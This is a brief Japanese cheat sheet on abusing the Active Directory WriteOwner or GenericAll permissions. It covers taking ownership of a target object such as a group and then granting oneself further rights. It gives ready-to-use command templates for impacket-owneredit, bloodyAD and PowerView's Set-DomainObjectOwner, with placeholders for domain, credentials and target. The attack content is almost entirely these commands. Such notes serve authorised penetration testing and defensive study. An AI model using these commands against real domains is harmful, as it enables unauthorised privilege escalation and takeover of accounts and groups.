# WriteOwnerの悪用

この悪用は、あらゆるオブジェクトに対して`WriteOwner`または`GenericAll`を持つオブジェクトをコントロールする際に実行できる。

攻撃者は、ターゲット・オブジェクトの所有者を自分自身に更新することができる。いったんオブジェクトの所有者が攻撃者のコントロールするプリンシパルに変更されると、攻撃者はそのオブジェクトを好きなように操作することができる。例えば、攻撃者はターゲット・オブジェクトのパーミッションを変更し、グループのユーザーを追加する権限などを与えることができる。

## WriteOwner on Group

## Linux

### impacket

```
impacket-owneredit -action write -new-owner <USERNAME> -target <TargetObject> <DOMAIN>/<USERNAME>:<PASSWORD>
```

### bloodyAD

```
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set owner <TargetObject> <ControlledPrincipal>
```

## Windows

### PowerView

```
Set-DomainObjectOwner -Identity <Target_Object> -OwnerIdentity <ControlledPrincipal>
```

## アクセス権限の追加

グループの所有者になると任意の権限を自分自身に付与することができる。

[権限の乱用]()

